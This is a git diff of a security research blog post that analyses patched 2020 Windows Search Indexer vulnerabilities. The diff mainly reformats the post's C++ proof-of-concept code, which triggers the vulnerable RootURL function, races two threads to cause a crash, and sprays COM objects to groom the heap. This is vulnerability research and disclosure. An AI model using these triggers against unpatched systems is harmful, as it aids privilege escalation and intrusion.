@@ -3,6 +3,8 @@ title: Analysis of vulnerabilities in MS SearchIndexer
 author: SungHyun Park @ Diffense
 ---
 
+### Introduction
+
 The Jan-Feb 2020 security patch fixes multiple bugs in the *Windows Search Indexer*. 
 
 - CVE-2020-0666, CVE-2020-0667, CVE-2020-0735, CVE-2020-0752 (Feb, 2020)
@@ -149,25 +151,26 @@ First of all, we need to construct the core of the COM client to trigger the vul
 Luckily, we were able to compile and test it through the COM based command line source code provided by MSDN(Reference). And We were able to write COM client code that triggers a vulnerable function like this:
 
 ```cpp
-    int wmain(int argc, wchar_t *argv[]){
-    		// Initialize COM library
-        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
-    		
-    		// CoClass Instanciate
-    		ISearchRoot *pISearchRoot;
-        CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot));
-        
-    		// Vulnerable function trigger
-    		pISearchRoot->put_RootURL(L"Shared RootURL");
-        PWSTR pszUrl = NULL;
-        HRESULT hr = pSearchRoot->get_RootURL(&pszUrl);
-        wcout << L"\t" << pszUrl;
-        CoTaskMemFree(pszUrl);
-    		
-    		// Free COM resource, End
-        pISearchRoot->Release();
-        CoUninitialize();
-    }
+int wmain(int argc, wchar_t *argv[])
+{
+    // Initialize COM library
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+
+    // CoClass Instanciate
+    ISearchRoot *pISearchRoot;
+    CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot));
+
+    // Vulnerable function trigger
+    pISearchRoot->put_RootURL(L"Shared RootURL");
+    PWSTR pszUrl = NULL;
+    HRESULT hr = pSearchRoot->get_RootURL(&pszUrl);
+    wcout << L"\t" << pszUrl;
+    CoTaskMemFree(pszUrl);
+
+    // Free COM resource, End
+    pISearchRoot->Release();
+    CoUninitialize();
+}
 ```
 
 Since then, triggering the bug is quite simple.
@@ -179,30 +182,30 @@ The first thread (Thread_01) was programmed to repeatedly write different length
 
 1. Thread_01
 ```cpp
-        DWORD __stdcall test_thread_01(LPVOID param)
-        {
-        	ISearchManager *pSearchManager = (ISearchManager*)param;
-        	wcout << L"First Tread Start!!!." << endl;
-        	while (1) {
-        		pSearchManager->put_RootURL(L"AA");
-        		pSearchManager->put_RootURL(L"AAAAAAAAAA");
-        	}
-        	return 0;
-        }
+DWORD __stdcall test_thread_01(LPVOID param)
+{
+    ISearchManager *pSearchManager = (ISearchManager*)param;
+    wcout << L"First Tread Start!!!." << endl;
+    while (1) {
+        pSearchManager->put_RootURL(L"AA");
+        pSearchManager->put_RootURL(L"AAAAAAAAAA");
+    }
+    return 0;
+}
 ```
 
 2. Thread_02
 ```cpp
-    DWORD __stdcall test_thread_02(LPVOID param)
-    {
-    	ISearchRoot *pISearchRoot = (ISearchRoot*)param;
-    	PWSTR get_pszUrl;
-    	wcout << L"Second Tread Start!!!." << endl;
-    	while (1) {
-    		pISearchRoot->get_RootURL(&get_pszUrl);
-    	}
-    	return 0;
+DWORD __stdcall test_thread_02(LPVOID param)
+{
+    ISearchRoot *pISearchRoot = (ISearchRoot*)param;
+    PWSTR get_pszUrl;
+    wcout << L"Second Tread Start!!!." << endl;
+    while (1) {
+        pISearchRoot->get_RootURL(&get_pszUrl);
     }
+    return 0;
+}
 ```
 
 Okay, now we created a crash!
@@ -223,29 +226,29 @@ Despite the Win 7 environment, it was very difficult for the client to manage th
 We programed the code like this:
 
 ```cpp
-    int wmain(int argc, wchar_t *argv[])
-    {
-    	CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
-    	ISearchRoot *pISearchRoot[20];
-    	for (int i = 0; i < 20; i++) {
-    		HRESULT hr = CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot[i]));
-    	}
-    	pISearchRoot[3]->Release();
-    	pISearchRoot[5]->Release();
-    	pISearchRoot[7]->Release();
-    	pISearchRoot[9]->Release();
-    	pISearchRoot[11]->Release();
-
-    	if (1)
-    	{
-    		wcout << L"Tread Start!!!." << endl;
-    		HANDLE t1 = CreateThread(NULL, 0, test_thread_01, (LPVOID)pISearchRoot[13], 0, NULL);
-    		HANDLE t2 = CreateThread(NULL, 0, test_thread_02, (LPVOID)pISearchRoot[13], 0, NULL);
-    		WaitForSingleObject(t1, 500);
-    	}
-    	CoUninitialize();
-    	return 0;
+int wmain(int argc, wchar_t *argv[])
+{
+    CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
+    ISearchRoot *pISearchRoot[20];
+    for (int i = 0; i < 20; i++) {
+        HRESULT hr = CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot[i]));
     }
+    pISearchRoot[3]->Release();
+    pISearchRoot[5]->Release();
+    pISearchRoot[7]->Release();
+    pISearchRoot[9]->Release();
+    pISearchRoot[11]->Release();
+
+    if (1)
+    {
+        wcout << L"Tread Start!!!." << endl;
+        HANDLE t1 = CreateThread(NULL, 0, test_thread_01, (LPVOID)pISearchRoot[13], 0, NULL);
+        HANDLE t2 = CreateThread(NULL, 0, test_thread_02, (LPVOID)pISearchRoot[13], 0, NULL);
+        WaitForSingleObject(t1, 500);
+    }
+    CoUninitialize();
+    return 0;
+}
 ```
 
 We completed the analysis and found that if the client did not release the pISearchRoot object, an IRpcStubBuffer objects would remain on the server heap. And we also saw that the IRpcStubBuffer object remained near the location of the heap where the vulnerability occurs!
